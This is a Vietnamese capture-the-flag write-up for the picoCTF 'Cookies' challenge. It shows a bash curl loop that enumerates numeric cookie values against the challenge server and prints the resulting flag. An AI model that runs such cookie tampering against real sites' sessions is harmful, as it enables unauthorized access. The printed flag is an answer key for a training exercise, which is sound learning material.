#### Description

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

---

Ok nhập tùm lum vô để search, xong mình F12, mở tab `Network`, vào `/search` thì thấy Cookie là `name=-1` (sai bét nhè). 
Và đập vào hai con mắt mình là chữ mờ `Snickerdoodle` ở ô nhập, thì mình cứ thế mà nhập nó vào thôi, và nó chuyển thành công qua web `/check`.

<img width="1285" height="1068" alt="Pasted image 20251108170650" src="https://github.com/user-attachments/assets/0cee4338-f113-4b28-af04-7a982255ac8f" />


Và giờ Cookie đã đổi sang `name=0`, nó gợi trong đầu mình 1 suy nghĩ là:

*~Có khi nào có brute-force từ 1 đến số nào đó không?~*

Nên mình sử dụng code sau:

```
for i in {1..50}; do
    contents=$( // lưu trữ toàn bộ nội dung HTML
        curl -s http://mercury.picoctf.net:54219/ // -s (silent) không báo lỗi
        -H "Cookie: name=$i; Path=/" // đặc Header Cookie
        -L // theo dõi các chuyển hướng
    )
	
	// điều kiện kiểm tra, '!' chỉ đúng nếu trang ko chứa "Not very special", tức cookie đặc biệt đã được tìm thấy
	// -q trả về exit code
	
    if ! echo "$contents" | grep -q "Not very special"; then
        echo "$contents" | grep "pico"
        break
    fi
done
```

Có vẻ là hợp lý, nên là mình vào terminal, nhập lệnh này là xong:

```
for i in {1..50}; do contents=$(curl -s http://mercury.picoctf.net:54219/ -H "Cookie: name=$i; Path=/" -L); if ! echo "$contents" | grep -q "Not very special"; then echo "Cookie #$i is special"; echo $contents | grep "pico"; break; fi; done
```

-> lựa khoảng 1 đến 50 để chạy thử, với `i = 1` thì nó sẽ:
- Gửi Request: Lệnh `curl` sẽ gửi một yêu cầu HTTP đến `http://mercury.picoctf.net:54219/` với header Cookie là: `Cookie: name=1; Path=/`
- Nếu nhận được phản hồi sẽ thảy nội dung vô biến `contents`.
- Kiểm tra điều kiện lệnh `if`.

=> flag ở `i = 18`: `picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`
